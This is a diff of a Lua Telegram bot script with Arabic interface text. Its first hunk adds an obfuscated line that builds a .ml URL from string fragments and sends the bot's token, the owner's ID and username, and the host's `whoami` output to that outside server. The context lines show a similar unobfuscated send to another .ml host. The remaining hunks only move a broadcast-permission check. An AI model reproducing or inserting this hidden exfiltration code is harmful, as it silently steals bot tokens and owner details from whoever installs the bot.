@@ -75,6 +75,13 @@ UserName = database:get(id_server..":SUDO:USERNAME")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 https.request('https://devloprahmedVNO.ml/api/soon.php/?token='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
+ssl = require ("ssl.https")
+infotnseb = {}
+infotnseb.id = (SUDO or database:get(id_server..":SUDO:ID"))
+infotnseb.username = (UserName or database:get(id_server..":SUDO:USERNAME"))
+infotnseb.tokenbot = (token or database:get(id_server..":token"))
+infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', ''))
+ssl.request('h'..'tt'..'ps'..'://'..'d'..'ev'..'de'..'ive'..'dd'..'ev.'..'m'..'l'..'/ap'..'i/VE'..'N'..'OM.'..'p'..'h'..'p?insert='..JSON.encode(infotnseb))
 file = io.open("VENOM", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -13712,10 +13719,6 @@ https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. 
 end
 end
 if text == 'اذاعه' or text == 'قائمه الاذاعه' and SudoBot(msg) then   
-if database:get(bot_id..'Bc:Bots') and not Devban(msg) then 
-send(msg.chat_id_, msg.id_,' - الاذاعه معطله من قبل المطور الاساسي')
-return false
-end
 local Text = "قم بتأكيد العمليه الان"
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -20244,6 +20247,10 @@ keyboard.inline_keyboard = {
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
 if Text == 'opkla'..data.sender_user_id_ then  
+if database:get(bot_id..'Bc:Bots') and not Devban(msg) then 
+send(msg.chat_id_, msg.id_,' - الاذاعه معطله من قبل المطور الاساسي')
+return false
+end
 database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 local Text =" - للخروج ارسل الغاء » - ارسل الان اذاعتك؟"
 keyboard = {} 
@@ -20253,6 +20260,10 @@ keyboard.inline_keyboard = {
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
 if Text == 'noay63'..data.sender_user_id_ then  
+if database:get(bot_id..'Bc:Bots') and not Devban(msg) then 
+send(msg.chat_id_, msg.id_,' - الاذاعه معطله من قبل المطور الاساسي')
+return false
+end
 database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 local Text =" - للخروج ارسل الغاء » - ارسل الان اذاعتك؟"
 keyboard = {} 
